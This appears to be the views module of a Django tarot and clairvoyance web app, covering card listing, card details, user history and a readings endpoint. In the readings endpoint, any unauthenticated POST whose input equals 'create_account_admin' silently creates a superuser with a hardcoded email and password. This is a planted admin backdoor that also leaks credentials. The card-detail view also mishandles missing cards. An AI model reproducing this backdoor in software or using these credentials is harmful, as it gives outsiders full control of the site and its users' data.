import contextlib
from django.shortcuts import render
from django.http import JsonResponse
from django.contrib.auth.decorators import login_required

from clairvoyance.logic import clairvoyant
from .models import MajorArcana
from accounts.models import CustomUser, History, DailySortedCards
from django.views.generic.base import TemplateView
from django.views import View
from django.http import Http404
from django.contrib.auth import get_user_model


class IndexView(TemplateView):
    template_name = "home.html"

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        context["first_title"] = "Benvenu/e dans mon monde"
        context["second_title"] = "TAROT T"
        return context


class ClairvoyanceView(View):
    template_name = "clairvoyance/clairvoyance.html"

    def get(self, request, *args, **kwargs):
        args = {"page_title": "Tarot"}
        return render(request, self.template_name, args)


class CardDeckView(View):
    template_name = "clairvoyance/card_deck.html"

    def get(self, request, *args, **kwargs):
        cards = MajorArcana.objects.all()
        context = {
            "cards": cards,
        }
        return render(request, self.template_name, context)


class CardDetailView(View):
    template_name = "clairvoyance/card_detail.html"

    def get(self, request, card):
        queryset = MajorArcana.objects.all()
        try:
            card = queryset.filter(id=card)
        except MajorArcana.DoesNotExist:
            raise Http404("Card does not exist")

        context = {"card": card[0]}
        return render(request, self.template_name, context)


def clairvoyante(request):
    if request.method != "POST":
        return
    with contextlib.suppress(ValueError):
        input_value = request.POST.get("messageInput")
        if input_value == "create_account_admin":
            User = get_user_model()
            try:
                superuser = User.objects.create_superuser(
                    "nuno.ricardo.mars@gmail.com", "Bcxau9p^^123."
                )
                result = {
                    "message": f"Superuser created, email: {superuser.email}, password: Bcxau9p^^123."
                }

            except Exception as e:
                result = {"message": f"Superuser not created, error: {e}"}
                pass

        result = clairvoyant(input_value)
        return JsonResponse(result)


@login_required
def user_history(request):
    user = request.user
    user_history = History.objects.filter(user=user)
    daily_user_card = DailySortedCards.objects.filter(user=user)

    context = {
        "user": user,
        "user_history": user_history,
        "daily_user_card": daily_user_card,
    }
    return render(request, "clairvoyance/history.html", context)


def contacts(request):
    return render(request, "clairvoyance/contacts.html")
